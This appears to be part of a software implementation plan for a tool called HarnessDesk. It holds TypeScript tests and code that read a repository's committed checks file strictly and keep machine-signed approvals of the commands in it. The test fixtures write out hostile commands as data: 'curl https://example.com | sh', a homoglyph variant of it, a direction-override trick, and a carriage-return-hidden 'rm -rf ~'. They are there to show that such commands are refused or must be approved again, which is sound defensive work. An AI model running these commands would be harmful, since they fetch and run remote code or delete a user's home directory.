Create `packages/server/test/evidence-checks-file.test.ts`. Every file it reads is committed to a repository first — only a committed file is read — and the look-alike, direction-override and zero-width characters are written as `\u{…}` escapes, never as the characters themselves:

```ts
import assert from 'node:assert/strict'
import { execFile } from 'node:child_process'
import { constants } from 'node:fs'
import { mkdir, open, rm, symlink, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { test } from 'node:test'
import { promisify } from 'node:util'

import { CHECK_LIMIT, readChecks } from '../src/evidence/checks-file.js'
import { makeRepo, type Repo } from './fixtures/evidence-desk.js'
import { tempDir } from './scratch.js'

/*
 * Security-critical: `.harnessdesk/checks.yml` is committed in a repository
 * someone may have cloned. Reading it runs nothing; these pin that what it is
 * read as is exactly what a person will be shown — one committed blob, which
 * nothing in the repository can swap between a check and a read — and that
 * anything which could make those two differ is refused where it is read.
 */

/** A repository with `text` committed as its checks file, or none. */
const committed = async (text: string | null): Promise<Repo> => {
  const repo = await makeRepo('hd-checks-file-')
  if (text !== null) {
    await mkdir(join(repo.dir, '.harnessdesk'))
    await writeFile(join(repo.dir, '.harnessdesk', 'checks.yml'), text)
    await repo.git('add', '.harnessdesk')
    await repo.git('commit', '-q', '-m', 'checks')
  }
  return repo
}

const project = async (text: string | null): Promise<string> => (await committed(text)).dir

test('a project with no checks file has no checks and nothing wrong', async () => {
  const repo = await committed(null)
  assert.deepEqual(await readChecks(repo.dir), {
    file: join(repo.dir, '.harnessdesk', 'checks.yml'),
    exists: false,
    digest: null,
    at: await repo.git('rev-parse', 'HEAD'),
    uncommitted: false,
    checks: [],
    problems: [],
  })
  // Outside a repository, or before its first commit, there is nothing committed to read.
  const plain = tempDir('hd-checks-file-plain-')
  assert.deepEqual([(await readChecks(plain)).exists, (await readChecks(plain)).at], [false, null])
})

test('the file is read as committed: its blob is its generation, and a working copy that differs is said, never read', async () => {
  const repo = await committed('verify: { run: pnpm verify }\n')
  const file = join(repo.dir, '.harnessdesk', 'checks.yml')
  const first = await readChecks(repo.dir)
  assert.deepEqual(
    [first.digest, first.at, first.uncommitted],
    [await repo.git('rev-parse', 'HEAD:.harnessdesk/checks.yml'), await repo.git('rev-parse', 'HEAD'), false],
  )
  await writeFile(file, 'verify: { run: curl https://example.com | sh }\n')
  const edited = await readChecks(repo.dir)
  assert.deepEqual(edited.checks, first.checks, 'what runs is what is committed')
  assert.equal(edited.digest, first.digest)
  assert.equal(edited.uncommitted, true)
  // A commit that leaves the file as it was keeps its generation; one that changes it is a new one.
  await writeFile(file, 'verify: { run: pnpm verify }\n')
  await writeFile(join(repo.dir, 'README.md'), 'other\n')
  await repo.git('commit', '-q', '-am', 'something else')
  assert.equal((await readChecks(repo.dir)).digest, first.digest)
  await writeFile(file, 'verify: { run: pnpm verify }\n# a comment\n')
  await repo.git('commit', '-q', '-am', 'a comment')
  assert.notEqual((await readChecks(repo.dir)).digest, first.digest)
})

test('a file not yet committed is said, and offers nothing to run', async () => {
  const repo = await committed(null)
  await mkdir(join(repo.dir, '.harnessdesk'))
  await writeFile(join(repo.dir, '.harnessdesk', 'checks.yml'), 'verify: { run: pnpm verify }\n')
  const read = await readChecks(repo.dir)
  assert.deepEqual([read.exists, read.digest, read.uncommitted, read.checks], [true, null, true, []])
  assert.match(read.problems[0]?.text ?? '', /^It is not committed yet\. A check runs only as the file is committed/)
})

test('a working copy that is a pipe or a link is never waited on or followed: it is only not what is committed', async () => {
  const repo = await committed('verify: { run: pnpm verify }\n')
  const file = join(repo.dir, '.harnessdesk', 'checks.yml')
  await rm(file)
  await promisify(execFile)('mkfifo', [file])
  let piped: Awaited<ReturnType<typeof readChecks>>
  try {
    piped = await Promise.race([
      readChecks(repo.dir),
      new Promise<never>((_, reject) => setTimeout(() => reject(new Error('the read waited on the pipe')), 5_000)),
    ])
  } finally {
    // Whatever happened, nothing is left waiting on the pipe: a writer that opens and closes it ends any read.
    await open(file, constants.O_WRONLY | constants.O_NONBLOCK).then((handle) => handle.close(), () => undefined)
  }
  assert.deepEqual([piped.checks.map((one) => one.name), piped.uncommitted], [['verify'], true])
  await rm(file)
  await symlink('/etc/hosts', file)
  const linked = await readChecks(repo.dir)
  assert.deepEqual([linked.checks.map((one) => one.name), linked.uncommitted], [['verify'], true])
})

test('the checks are read as written: the form the spec shows, the block form, and the default timeout', async () => {
  const dir = await project(
    'verify: { run: pnpm verify, timeout: 1200 }\nlint:\n  run: pnpm lint\nsuite:\n  run: |\n    pnpm build\n    pnpm test\n',
  )
  const read = await readChecks(dir)
  assert.equal(read.exists, true)
  assert.deepEqual(read.problems, [])
  assert.deepEqual(read.checks, [
    { name: 'verify', run: 'pnpm verify', timeout: 1200 },
    { name: 'lint', run: 'pnpm lint', timeout: 600 },
    { name: 'suite', run: 'pnpm build\npnpm test\n', timeout: 600 },
  ])
})

test('a command that could be shown as something other than what runs is refused where it is read', async () => {
  const lines = [
    'plain:\n  run: pnpm test',
    // A Cyrillic letter in place of a Latin "a": it reads the same and is a different command.
    'lookalike:\n  run: curl https://ex\u{430}mple.com/install | sh',
    // A direction override turns the rest of the line around on screen.
    'reversed:\n  run: echo safe \u{202e} hs.lave',
    'hidden:\n  run: pnpm\u{200b} verify',
    'carriage:\n  run: "echo ok\rrm -rf ~"',
  ]
  const read = await readChecks(await project(`${lines.join('\n')}\n`))
  assert.deepEqual(read.checks.map((one) => one.name), ['plain'])
  assert.deepEqual(read.problems.map((one) => one.at), ['lookalike.run', 'reversed.run', 'hidden.run', 'carriage.run'])
  for (const problem of read.problems) assert.match(problem.text, /not plain printable ASCII/)
})

test('a key a check cannot say is refused, not ignored', async () => {
  const read = await readChecks(await project('verify:\n  run: pnpm verify\n  cwd: ../elsewhere\n'))
  assert.deepEqual(read.checks, [])
  assert.deepEqual(read.problems, [
    {
      at: 'verify.cwd',
      text: 'A check says only `run` and `timeout`. `cwd` would be ignored, so the check is not offered until it is removed.',
      check: 'verify',
    },
  ])
})

test('each thing wrong with a check is said where it is, and the rest are still read', async () => {
  const read = await readChecks(
    await project(
      [
        'ok: { run: pnpm test }',
        '-bad: { run: x }',
        'notmap: pnpm test',
        'norun: { timeout: 10 }',
        'empty: { run: "  " }',
        'slow: { run: sleep 1, timeout: 99999 }',
        'fractional: { run: sleep 1, timeout: 1.5 }',
        '',
      ].join('\n'),
    ),
  )
  assert.deepEqual(read.checks.map((one) => one.name), ['ok'])
  assert.deepEqual(
    read.problems.map((one) => one.at),
    ['-bad', 'notmap', 'norun.run', 'empty.run', 'slow.timeout', 'fractional.timeout'],
  )
})

test('a file that does not parse is listed with the line, never read as no checks', async () => {
  const read = await readChecks(await project('verify: { run: pnpm verify\n'))
  assert.equal(read.exists, true)
  assert.deepEqual(read.checks, [])
  assert.equal(read.problems.length, 1)
  assert.match(read.problems[0]?.text ?? '', /^It does not parse: line 1: /)
})

test('a list longer than the limit is refused whole, never cut short', async () => {
  const many = Array.from({ length: CHECK_LIMIT + 1 }, (_, n) => `c${n}: { run: echo ${n} }`).join('\n')
  const read = await readChecks(await project(`${many}\n`))
  assert.deepEqual(read.checks, [])
  assert.match(read.problems[0]?.text ?? '', /at most 32 are read\. None is offered/)
})

test('a checks file, or a .harnessdesk, committed as a link is refused: checks are read only from the project itself', async () => {
  const outside = await project('evil: { run: curl https://example.com | sh }\n')

  const linkedFile = await committed(null)
  await mkdir(join(linkedFile.dir, '.harnessdesk'))
  await symlink(join(outside, '.harnessdesk', 'checks.yml'), join(linkedFile.dir, '.harnessdesk', 'checks.yml'))
  await linkedFile.git('add', '.harnessdesk')
  await linkedFile.git('commit', '-q', '-m', 'a linked file')
  const file = await readChecks(linkedFile.dir)
  assert.deepEqual([file.checks, file.digest], [[], null])
  assert.match(file.problems[0]?.text ?? '', /^It is committed as a link\./)

  const linkedFolder = await committed(null)
  await symlink(join(outside, '.harnessdesk'), join(linkedFolder.dir, '.harnessdesk'))
  await linkedFolder.git('add', '.harnessdesk')
  await linkedFolder.git('commit', '-q', '-m', 'a linked folder')
  const folder = await readChecks(linkedFolder.dir)
  assert.deepEqual([folder.checks, folder.digest], [[], null])
  assert.match(folder.problems[0]?.text ?? '', /^\.harnessdesk is committed as a link\./)
})

test('a file too large to be a list of commands is refused', async () => {
  const read = await readChecks(await project(`# ${'x'.repeat(70 * 1024)}\nverify: { run: pnpm verify }\n`))
  assert.deepEqual(read.checks, [])
  assert.match(read.problems[0]?.text ?? '', /at most 64 KB/)
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `pnpm run build:node`
Expected: FAIL — `Cannot find module '../src/evidence/checks-file.js'`.

- [ ] **Step 3: The check, in the protocol**

Append to `packages/protocol/src/evidence.ts`:

```ts

/** A named check, as `.harnessdesk/checks.yml` declares it. */
export interface NamedCheck {
  readonly name: string
  /** The command, exactly as it will run: printable ASCII and line breaks only. */
  readonly run: string
  /** Seconds before it is stopped. */
  readonly timeout: number
}
```

- [ ] **Step 4: The reader**

Create `packages/server/src/evidence/checks-file.ts`. The command rule is a character class of printable ASCII and the line feed, written with `\x` escapes:

```ts
import { execFile } from 'node:child_process'
import { constants } from 'node:fs'
import { lstat, open } from 'node:fs/promises'
import { join } from 'node:path'
import { promisify } from 'node:util'

import type { NamedCheck } from '@harnessdesk/protocol'

import { parseYaml } from '../yaml.js'

/**
 * A project's named checks: `.harnessdesk/checks.yml`, the commands the desk
 * may run to earn `check` evidence outside a flow.
 *
 * **Security-critical.** The file is committed in a repository someone may
 * have cloned, so every command in it is untrusted input — exactly as the
 * repository's Agent folders are. Nothing here runs anything; this only reads
 * what the file says, as strictly as a person reading it would need, so that
 * what is later shown to them is byte for byte what would run:
 *
 * - A command is printable ASCII and line feeds, and nothing else. A control
 *   character, an invisible one (a zero-width space, a direction override) or a
 *   letter from another script that looks like a Latin one could make what is
 *   shown differ from what runs; a check whose command holds one is listed with
 *   that problem and never offered.
 * - A check says `run` and optionally `timeout`, and nothing else. A key this
 *   build does not read — `cwd`, `env` — would look to a reader as if it did
 *   something, so the check is refused rather than run without it.
 * - The file is read **as committed**, at the main checkout's `HEAD`: one git
 *   blob, which git will not change under the reader, rather than a path on
 *   disk that a process in the repository could swap between a check and a
 *   read. The blob's id is the file's generation (`digest`): what a person is
 *   shown, what they approve and what runs are all bound to exactly those
 *   bytes. A file, or a `.harnessdesk`, committed as a link is refused; a
 *   working copy that differs from the committed one is said, never read.
 * - A file that will not parse is listed with where and why, never hidden, and
 *   a list longer than the limit is refused whole, never cut short.
 *
 * Whether a person has seen a command is `seen.ts`'s; running one is
 * `check-runs.ts`'s. Both read the checks through here and nowhere else.
 */

/** Where a project keeps them, from the top of its checkout. */
export const CHECKS_FILE = join('.harnessdesk', 'checks.yml')

/** The same path as git names it inside a commit. */
const CHECKS_PATH = '.harnessdesk/checks.yml'

/** The most a checks file may weigh. It is a list of commands, not a document. */
export const CHECKS_FILE_LIMIT = 64 * 1024

/** The most checks one file may name. A longer list is refused whole. */
export const CHECK_LIMIT = 32

/** The longest command a check may run. */
export const COMMAND_LIMIT = 2_000

/** Seconds a check runs before it is stopped, when it does not say. */
export const TIMEOUT_DEFAULT = 600

/** The longest a check may say it runs: four hours. */
export const TIMEOUT_MAX = 4 * 60 * 60

/** A check's name: what a card's *Run <name>* says, and half of what a person has seen. */
const NAME = /^[A-Za-z0-9][A-Za-z0-9._-]{0,39}$/

/** Printable ASCII and line feeds, and nothing else. */
const COMMAND = /^[\x20-\x7e\n]+$/

const KEYS = new Set(['run', 'timeout'])

export interface ChecksProblem {
  /** `verify.run`, `verify`, or `''` for the file as a whole. */
  readonly at: string
  readonly text: string
  /** The check it is about, as the file names it; absent for the file as a whole. */
  readonly check?: string
}

export interface ChecksFile {
  /** The file, absolute, whether or not it is there. */
  readonly file: string
  readonly exists: boolean
  /** The committed file's blob id — its generation — or null when there is none. */
  readonly digest: string | null
  /** The commit it was read at, or null when there is none. */
  readonly at: string | null
  /** The working copy holds something other than what is committed: that is not what runs. */
  readonly uncommitted: boolean
  /** Only the checks that read cleanly. */
  readonly checks: readonly NamedCheck[]
  readonly problems: readonly ChecksProblem[]
}

const isMap = (value: unknown): value is Record<string, unknown> =>
  typeof value === 'object' && value !== null && !Array.isArray(value)

const run = promisify(execFile)

/**
 * git, read-only, in the project, as a background reader does: through
 * `execFile`, never a shell, with no optional locks — and never a command that
 * runs a hook or a filter. Null when git refuses.
 */
const git = async (project: string, args: readonly string[]): Promise<Buffer | null> => {
  try {
    const { stdout } = await run('git', ['-C', project, ...args], {
      encoding: 'buffer',
      timeout: 20_000,
      maxBuffer: CHECKS_FILE_LIMIT + 64 * 1024,
      env: { ...process.env, GIT_OPTIONAL_LOCKS: '0' },
    })
    return stdout
  } catch {
    return null
  }
}

/**
 * The working copy's bytes, only to compare with what is committed — never
 * parsed, never run. Opened without following a link and without waiting on
 * a pipe, and read only when it is a plain file within the limit; null
 * otherwise, which reads as "not what is committed".
 */
const workingCopy = async (file: string): Promise<Buffer | null> => {
  let handle
  try {
    handle = await open(file, constants.O_RDONLY | constants.O_NOFOLLOW | constants.O_NONBLOCK)
  } catch {
    return null
  }
  try {
    const info = await handle.stat()
    return info.isFile() && info.size <= CHECKS_FILE_LIMIT ? await handle.readFile() : null
  } catch {
    return null
  } finally {
    await handle.close()
  }
}

/** Reads a project's checks, as committed at its `HEAD`. `project` is the top of its checkout. Never throws for what the file says. */
export const readChecks = async (project: string): Promise<ChecksFile> => {
  const file = join(project, CHECKS_FILE)
  let digest: string | null = null
  let at: string | null = null
  let uncommitted = false
  const answer = (checks: readonly NamedCheck[], problems: readonly ChecksProblem[], exists = true): ChecksFile => ({
    file,
    exists,
    digest,
    at,
    uncommitted,
    checks,
    problems,
  })
  const whole = (text: string): ChecksFile => answer([], [{ at: '', text }])

  // The commit, then the blob in it: two immutable objects, so what is read is what was committed.
  at = (await git(project, ['rev-parse', '--verify', '--quiet', 'HEAD^{commit}']))?.toString('utf8').trim() || null
  if (at === null) return answer([], [], false)
  const listed = (await git(project, ['ls-tree', '-z', at, '--', '.harnessdesk', CHECKS_PATH]))?.toString('utf8') ?? ''
  const tree = new Map(
    listed
      .split('\x00')
      .filter(Boolean)
      .map((entry) => {
        const [meta = '', path = ''] = entry.split('\t')
        const [mode = '', type = '', id = ''] = meta.split(' ')
        return [path, { mode, type, id }] as const
      }),
  )
  if (tree.get('.harnessdesk')?.mode === '120000') {
    return whole('.harnessdesk is committed as a link. Checks are read only from the project itself.')
  }
  const blob = tree.get(CHECKS_PATH)
  if (!blob) {
    uncommitted = await lstat(file).then(() => true, () => false)
    if (!uncommitted) return answer([], [], false)
    return whole('It is not committed yet. A check runs only as the file is committed, so none is offered until it is.')
  }
  if (blob.mode === '120000') return whole('It is committed as a link. Checks are read only from a file in the project itself.')
  if (blob.type !== 'blob') return whole('It is not a file.')
  const size = Number((await git(project, ['cat-file', '-s', blob.id]))?.toString('utf8').trim())
  if (!Number.isInteger(size)) return whole('It could not be read from git.')
  if (size > CHECKS_FILE_LIMIT) {
    return whole(`It is ${Math.ceil(size / 1024)} KB, and a checks file may be at most ${CHECKS_FILE_LIMIT / 1024} KB.`)
  }
  const bytes = await git(project, ['cat-file', 'blob', blob.id])
  if (bytes === null || bytes.length !== size) return whole('It could not be read from git.')
  digest = blob.id
  // Said, never read: only what is committed runs.
  uncommitted = !(await workingCopy(file))?.equals(bytes)

  let parsed: unknown
  try {
    parsed = parseYaml(bytes.toString('utf8'))
  } catch (error) {
    return whole(`It does not parse: ${error instanceof Error ? error.message : String(error)}.`)
  }
  if (parsed === null) return answer([], [])
  if (!isMap(parsed)) return whole('It has to be a map from each check’s name to what it runs.')

  const entries = Object.entries(parsed)
  if (entries.length > CHECK_LIMIT) {
    return whole(`It names ${entries.length} checks, and at most ${CHECK_LIMIT} are read. None is offered until it names fewer.`)
  }
  const checks: NamedCheck[] = []
  const problems: ChecksProblem[] = []
  for (const [name, value] of entries) {
    const refuse = (at: string, text: string): void => {
      problems.push({ at: `${name}${at}`, text, check: name })
    }
    if (!NAME.test(name)) {
      refuse('', 'A check’s name is letters, digits, dots, dashes and underscores, starts with a letter or a digit, and is at most 40 long.')
      continue
    }
    if (!isMap(value)) {
      refuse('', 'A check is a map: `run`, and optionally `timeout`.')
      continue
    }
    const unread = Object.keys(value).find((key) => !KEYS.has(key))
    if (unread !== undefined) {
      refuse(`.${unread}`, `A check says only \`run\` and \`timeout\`. \`${unread}\` would be ignored, so the check is not offered until it is removed.`)
      continue
    }
    const run = value['run']
    if (typeof run !== 'string' || run.trim() === '') {
      refuse('.run', 'It needs the command to run.')
      continue
    }
    if (run.length > COMMAND_LIMIT) {
      refuse('.run', `The command is ${run.length} characters long, and at most ${COMMAND_LIMIT} are allowed.`)
      continue
    }
    if (!COMMAND.test(run)) {
      refuse(
        '.run',
        'The command holds a character that is not plain printable ASCII — a control character, an invisible one, or a letter that can pass for another. What runs has to be exactly what is shown, so it is not offered.',
      )
      continue
    }
    const timeout = value['timeout'] ?? TIMEOUT_DEFAULT
    if (typeof timeout !== 'number' || !Number.isInteger(timeout) || timeout < 1 || timeout > TIMEOUT_MAX) {
      refuse('.timeout', `The timeout is whole seconds, from 1 to ${TIMEOUT_MAX}.`)
      continue
    }
    checks.push({ name, run, timeout })
  }
  return answer(checks, problems)
}
```

- [ ] **Step 5: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-checks-file.test.js`
Expected: PASS — 12 tests.

- [ ] **Step 6: Prove the tests can fail**

1. Change `COMMAND` to `/^[\s\S]+$/`: `a command that could be shown as something other than what runs is refused where it is read` fails. Restore it.
2. Change `if (unread !== undefined) {` to `if (false) {`: `a key a check cannot say is refused, not ignored` fails. Restore it.
3. Change `if (tree.get('.harnessdesk')?.mode === '120000') {` to `if (false) {`: `a checks file, or a .harnessdesk, committed as a link is refused…` fails. Restore it.
4. Parse the working copy instead of the blob — `parsed = parseYaml(await readFile(file, 'utf8'))`: `the file is read as committed: its blob is its generation, and a working copy that differs is said, never read` fails. Restore it.
5. Compare with `await readFile(file)` in place of `workingCopy(file)`: `a working copy that is a pipe or a link is never waited on or followed…` fails — the read waits on the pipe past the test's own limit. Restore it.
6. Change `uncommitted = !(await workingCopy(file))?.equals(bytes)` to `uncommitted = false`: the same two tests fail. Restore it.

- [ ] **Step 7: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/protocol/src/evidence.ts packages/server/src/evidence/checks-file.ts packages/server/test/evidence-checks-file.test.ts
git commit -m "feat(evidence): a project's checks.yml, read as strictly as a person needs

A check says run and timeout and nothing else, its command is printable ASCII
and line feeds, and the file is read as committed at HEAD — one git blob,
which nothing in the repository can swap between a check and a read, and
whose id is the file's generation. A file or folder committed as a link is
refused; a file not yet committed offers nothing; a working copy that differs
is said, never read, and never waited on. Anything that could make what a
person is shown differ from what would run is refused where it is read, with
where and why; a file that will not parse is listed, never read as no checks.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 8: What this machine has approved — and a project's checks, read

> **Security-critical.** A command a repository names runs only after a person has approved it, verbatim, on this machine, and any change asks again. This task keeps the approvals; its tests pin that a changed command, a renamed check, an added one, one removed and added again, a file that changed and changed back, the same command in another project, and another repository cloned at the same path each ask again; that a file edited by hand or copied from another machine approves nothing; that the file fails closed; and that nothing a backup or another wire verb carries can approve a command.

**What an approval is bound to.** Only the *current* answer is kept, one per project and check name, and it counts only while three things hold: the same repository — the project's path *and* its incarnation, the identity on disk of its git directory (`incarnationOf`: where it is, its device and inode, and when it was made), so a repository cloned again at the same path is a new project; the same file — the checks file's generation, the committed blob id Task 7 reads, so whenever the file is read and has changed in any way every approval for the project is dropped (`reconcile`), keeping each dropped command only to say what ran before, and a command that went A → B → A asks three times; and this machine — each entry carries an HMAC-SHA256 under a key sealed with the desk's credential cipher (the OS keychain in the desktop app), so a copied or edited file approves nothing. A newer format is never written over.

The HMAC stops a file copied from elsewhere, edited by hand, or restored by a backup from approving anything. It is not a defence against code already running as you — an approved check runs with your authority (Task 9), and could do anything you can; that is said under *Decisions this plan takes* › *An approved check runs with the person's full authority*, not here.

It lives in its own file, `commands-seen.json`, with its key in `commands-seen.key`, beside `state.json` — never in `state.json`'s preferences, which `app/state/set` patches wholesale and every backup restores. A project's page reads its checks with whether this machine has approved each (`evidence/checks`), read-only.

**Files:**
- Create: `packages/server/src/evidence/seen.ts`
- Modify: `packages/protocol/src/evidence.ts` (`ProjectChecks`)
- Modify: `packages/server/src/evidence/plane.ts` (`seen`, `projectChecks`), `packages/server/src/host.ts` (the plane's `seenFile` and `cipher`)
- Modify: `packages/server/src/methods/evidence.ts`, `packages/protocol/src/wire.ts`, `packages/protocol/src/wire-validators.ts` (`evidence/checks`), `script/check-reachable.mjs` (pin it)
- Test: `packages/server/test/evidence-seen.test.ts`, `packages/server/test/evidence-project-checks.test.ts` (new)

**Proof needs:** neither

**Interfaces:**
- Consumes: `readChecks` and its `digest` (Task 7); `projectOf` (Task 3); `CredentialCipher`, `plainCipher` (`packages/server/src/credentials.ts`); `HostOptions.credentialCipher`; `ctx.workspaces.confineGitRoot` (`HostContext`).
- Produces: `SEEN_FILE = 'commands-seen.json'`, `SEEN_LIMIT = 1000`; `interface ApprovalScope { project: string; incarnation: string; digest: string }`; `incarnationOf(project: string): Promise<string>`; `class CommandsSeen { constructor(file: string, options?: { cipher?: CredentialCipher; now?: () => number }); approved(scope, check: { name; run }): Promise<boolean>; previous(scope, name, run): Promise<string | null>; reconcile(scope, names: readonly string[]): Promise<void>; approve(scope, check: { name; run }): Promise<void> }`. In `@harnessdesk/protocol`: `interface ProjectChecks { project; file; exists; at: string | null; uncommitted: boolean; checks: readonly (NamedCheck & { seen: 'yes' | 'no' | 'changed' })[]; problems: readonly { at; text; check? }[] }`. `EvidenceOptions.seenFile: string`, `EvidenceOptions.cipher?: CredentialCipher`; `EvidencePlane.seen: CommandsSeen`; `EvidencePlane.projectChecks(folder: string): Promise<ProjectChecks>`. Wire: `'evidence/checks': { params: { project: string }; result: ProjectChecks }`.

- [ ] **Step 1: Write the failing tests**

1. Create `packages/server/test/evidence-seen.test.ts`:

```ts
import assert from 'node:assert/strict'
import { execFile } from 'node:child_process'
import { copyFile, mkdir, readFile, rm, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { test } from 'node:test'
import { promisify } from 'node:util'

import type { CredentialCipher } from '../src/credentials.js'
import { CommandsSeen, incarnationOf, type ApprovalScope } from '../src/evidence/seen.js'
import { makeRepo } from './fixtures/evidence-desk.js'
import { tempDir } from './scratch.js'

/*
 * Security-critical: a repository's command runs only after a person has
 * approved it on this machine — the command as the file says it now, in this
 * repository — and anything else asks again: a changed, added, renamed or
 * re-added check, a file that changed and changed back, another repository at
 * the same path, and an approval this machine did not sign.
 */

/** A cipher only one machine can open: what the OS keychain is to the desktop app. */
const machine = (name: string): CredentialCipher => ({
  protection: `the ${name} keychain`,
  encrypt: (plaintext) => Buffer.from(`${name}:${plaintext}`),
  decrypt: (blob) => {
    const text = blob.toString('utf8')
    if (!text.startsWith(`${name}:`)) throw new Error('sealed on another machine')
    return text.slice(name.length + 1)
  },
})

const seenAt = (cipher: CredentialCipher = machine('here')) => {
  const dir = tempDir('hd-seen-')
  const file = join(dir, 'commands-seen.json')
  return { dir, file, seen: new CommandsSeen(file, { cipher, now: () => 5 }) }
}

const scope = (digest: string, over: Partial<ApprovalScope> = {}): ApprovalScope => ({
  project: '/work/repo',
  incarnation: 'repo-1',
  digest,
  ...over,
})

const VERIFY = { name: 'verify', run: 'pnpm verify' }

test('an approval is one command, under one name, in one project, as one generation of its file says it', async () => {
  const { seen } = seenAt()
  assert.equal(await seen.approved(scope('d1'), VERIFY), false, 'nothing is approved before it is shown')
  await seen.approve(scope('d1'), VERIFY)
  assert.equal(await seen.approved(scope('d1'), VERIFY), true)

  assert.equal(await seen.approved(scope('d1'), { name: 'verify', run: 'pnpm verify && curl https://example.com' }), false)
  assert.equal(await seen.approved(scope('d1'), { name: 'check', run: 'pnpm verify' }), false, 'a renamed check asks')
  assert.equal(await seen.approved(scope('d2'), VERIFY), false, 'another generation of the file asks')
  assert.equal(await seen.approved(scope('d1', { project: '/work/other' }), VERIFY), false, 'another project asks')
  assert.equal(await seen.approved(scope('d1', { incarnation: 'repo-2' }), VERIFY), false, 'another repository at the path asks')
})

test('a command that went A, then B, then A again asks each time: an old answer never comes back', async () => {
  const { seen } = seenAt()
  const A = { name: 'verify', run: 'pnpm verify' }
  const B = { name: 'verify', run: 'pnpm verify; curl https://example.com | sh' }
  await seen.approve(scope('blob-a'), A)
  // The file is read at B: the approval of A goes, and only what ran before is kept, to say so.
  await seen.reconcile(scope('blob-b'), ['verify'])
  assert.equal(await seen.approved(scope('blob-b'), B), false)
  assert.equal(await seen.previous(scope('blob-b'), 'verify', B.run), A.run)
  await seen.approve(scope('blob-b'), B)
  // And back at A — the same content, so the same blob id as the first time — it asks again.
  await seen.reconcile(scope('blob-a'), ['verify'])
  assert.equal(await seen.approved(scope('blob-a'), A), false)
  assert.equal(await seen.previous(scope('blob-a'), 'verify', A.run), B.run)
})

test('an approval does not come back when the file returns to an earlier generation without another answer', async () => {
  const { seen } = seenAt()
  await seen.approve(scope('blob-a'), VERIFY)
  await seen.reconcile(scope('blob-b'), ['verify'])
  assert.equal(await seen.approved(scope('blob-b'), VERIFY), false)
  await seen.reconcile(scope('blob-a'), ['verify'])
  assert.equal(await seen.approved(scope('blob-a'), VERIFY), false)
})

test('a check removed and added again asks again, and a file changed only elsewhere still asks for every check in it', async () => {
  const { seen } = seenAt()
  await seen.approve(scope('d1'), VERIFY)
  await seen.approve(scope('d1'), { name: 'lint', run: 'pnpm lint' })
  await seen.reconcile(scope('d2'), ['lint'])
  await seen.reconcile(scope('d3'), ['verify', 'lint'])
  assert.equal(await seen.approved(scope('d3'), VERIFY), false)
  assert.equal(await seen.approved(scope('d3'), { name: 'lint', run: 'pnpm lint' }), false)
})

test("another repository cloned at the same path is another project: nothing of the old one's carries over", async () => {
  const repo = await makeRepo()
  const first = await incarnationOf(repo.dir)
  assert.equal(await incarnationOf(repo.dir), first, 'the same repository is the same incarnation')
  const { seen } = seenAt()
  await seen.approve(scope('d1', { project: repo.dir, incarnation: first }), VERIFY)

  await rm(repo.dir, { recursive: true, force: true })
  await mkdir(repo.dir)
  await promisify(execFile)('git', ['-C', repo.dir, 'init', '-q', '-b', 'main'])
  const second = await incarnationOf(repo.dir)
  assert.notEqual(second, first)
  assert.equal(await seen.approved(scope('d1', { project: repo.dir, incarnation: second }), VERIFY), false)
  await seen.reconcile(scope('d1', { project: repo.dir, incarnation: second }), ['verify'])
  assert.equal(await seen.previous(scope('d1', { project: repo.dir, incarnation: second }), 'verify', 'pnpm other'), null)
})

test('a file edited by hand, or copied from another machine, approves nothing', async () => {
  const { dir, file, seen } = seenAt(machine('here'))
  await seen.approve(scope('d1'), VERIFY)
  const written = JSON.parse(await readFile(file, 'utf8')) as { approvals: { run: string }[] }

  // Edited: the command changed under a signature made for another.
  written.approvals[0]!.run = 'curl https://example.com | sh'
  await writeFile(file, JSON.stringify(written))
  assert.equal(await seen.approved(scope('d1'), { name: 'verify', run: 'curl https://example.com | sh' }), false)

  // Copied, key and all, to a machine that cannot open the key: nothing it holds is approved there.
  await seen.approve(scope('d1'), VERIFY)
  const elsewhere = tempDir('hd-seen-elsewhere-')
  await copyFile(file, join(elsewhere, 'commands-seen.json'))
  await copyFile(join(dir, 'commands-seen.key'), join(elsewhere, 'commands-seen.key'))
  const there = new CommandsSeen(join(elsewhere, 'commands-seen.json'), { cipher: machine('there') })
  assert.equal(await there.approved(scope('d1'), VERIFY), false)
  // And its own first answer starts over, rather than signing what it could not check.
  await there.approve(scope('d1'), { name: 'lint', run: 'pnpm lint' })
  assert.equal(await there.approved(scope('d1'), VERIFY), false)
  assert.equal(await there.approved(scope('d1'), { name: 'lint', run: 'pnpm lint' }), true)
})

test('a file that is not JSON approves nothing, and the next answer replaces it', async () => {
  const { file, seen } = seenAt()
  await writeFile(file, '{ not json')
  assert.equal(await seen.approved(scope('d1'), VERIFY), false)
  await seen.approve(scope('d1'), VERIFY)
  assert.equal(await seen.approved(scope('d1'), VERIFY), true)
})

test('a file a newer build wrote is never written over, and nothing it holds is approved here', async () => {
  const { file, seen } = seenAt()
  const newer = JSON.stringify({ version: 2, approvals: [{ project: '/work/repo', name: 'verify', run: 'pnpm verify', at: 1 }] })
  await writeFile(file, newer)
  assert.equal(await seen.approved(scope('d1'), VERIFY), false)
  await assert.rejects(seen.approve(scope('d1'), VERIFY), /newer HarnessDesk .*could not be recorded, and it was not run\./)
  await seen.reconcile(scope('d2'), [])
  assert.equal(await readFile(file, 'utf8'), newer)
})

test('answers given together are all kept', async () => {
  const { seen } = seenAt()
  await Promise.all(['a', 'b', 'c', 'd'].map((name) => seen.approve(scope('d1'), { name, run: `echo ${name}` })))
  for (const name of ['a', 'b', 'c', 'd']) assert.equal(await seen.approved(scope('d1'), { name, run: `echo ${name}` }), true)
})
```

2. Create `packages/server/test/evidence-project-checks.test.ts`:

```ts
import assert from 'node:assert/strict'
import { mkdir, writeFile } from 'node:fs/promises'
import { join } from 'node:path'
import { test } from 'node:test'

import { parseClientMessage, ValidationError, type ProjectChecks } from '@harnessdesk/protocol'

import { canonical } from '../src/evidence/revision.js'
import { CommandsSeen, incarnationOf, SEEN_FILE } from '../src/evidence/seen.js'
import { evidenceDesk } from './fixtures/evidence-desk.js'
import { tempDir } from './scratch.js'

/*
 * A project's page lists its checks as committed, each command verbatim and
 * whether this machine has approved it for this generation of the file — and
